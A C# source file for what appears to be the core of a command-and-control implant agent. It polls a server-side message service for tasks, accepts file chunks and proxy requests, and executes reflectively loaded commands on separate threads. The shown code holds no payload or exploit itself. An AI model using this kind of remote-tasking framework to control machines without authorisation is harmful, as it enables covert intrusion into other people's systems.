using Agent.Commands;
using Agent.Commands.Services;
using Agent.Communication;
using Agent.Service;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Models
{
    public class Agent
    {
        public CommModule Communicator { get; set; }
        private IMessageService _messageService;
        private IFileService _fileService;
        private IProxyService _proxyService;
        private AgentMetadata _metadata;

        private CancellationTokenSource _tokenSource = new CancellationTokenSource();

        private List<AgentCommand> _commands = new List<AgentCommand>();

        public void LoadCommands()
        {
            var self = Assembly.GetExecutingAssembly();
            foreach (var type in self.GetTypes())
            {
                if (type.IsSubclassOf(typeof(AgentCommand)) && !type.ContainsGenericParameters)
                {
                    var instance = Activator.CreateInstance(type) as AgentCommand;
                    _commands.Add(instance);
                }
            }

        }

        public Agent(AgentMetadata metadata, CommModule commModule)
        {
            _metadata = metadata;
            this.Communicator = commModule;

            this._messageService = ServiceProvider.GetService<IMessageService>();
            this._fileService = ServiceProvider.GetService<IFileService>();
            this._proxyService = ServiceProvider.GetService<IProxyService>();

            LoadCommands();
        }

        public void Start()
        {
            this.Communicator.Start();
            while (!_tokenSource.IsCancellationRequested)
            {
                var messages = this._messageService.GetMessageTasksForAgent(this._metadata.Id);
                if (messages.Any())
                {
                    foreach (var mess in messages)
                    {
                        if (mess.FileChunk != null)
                            this._fileService.AddFileChunck(mess.FileChunk);
                        if (mess.ProxyMessages != null)
                            this._proxyService.AddRequests(mess.ProxyMessages);

                        HandleTask(mess.Items);
                    }

                }
                Thread.Sleep(10);
            }
        }


        public void Stop()
        {
            this._tokenSource.Cancel();
            this.Communicator.Stop();
        }

        public void HandleTask(IEnumerable<AgentTask> tasks)
        {
            foreach (var task in tasks)
            {
                Thread t = new Thread(this.StartHandleTask);
                t.Start(task);
            }
        }

        public void StartHandleTask(object task)
        {
            this.HandleTask(task as AgentTask);
        }

        public void HandleTask(AgentTask task)
        {
            var command = this._commands.FirstOrDefault(c => c.Name == task.Command);

            AgentTaskResult result = null;

            if (command is null)
            {
                result = new AgentTaskResult()
                {
                    Id = task.Id,
                    Result = $"Agent has no {task.Command} command registered!",
                    Status = AgentResultStatus.Completed,
                };
                this._messageService.SendResult(result);
            }
            else
            {
                var ctxt = new AgentCommandContext()
                {
                    Agent = this,
                    MessageService = _messageService,
                    FileService = _fileService,
                    ProxyService = _proxyService
                };
                command.Execute(task, ctxt);
            }
        }
    }
}
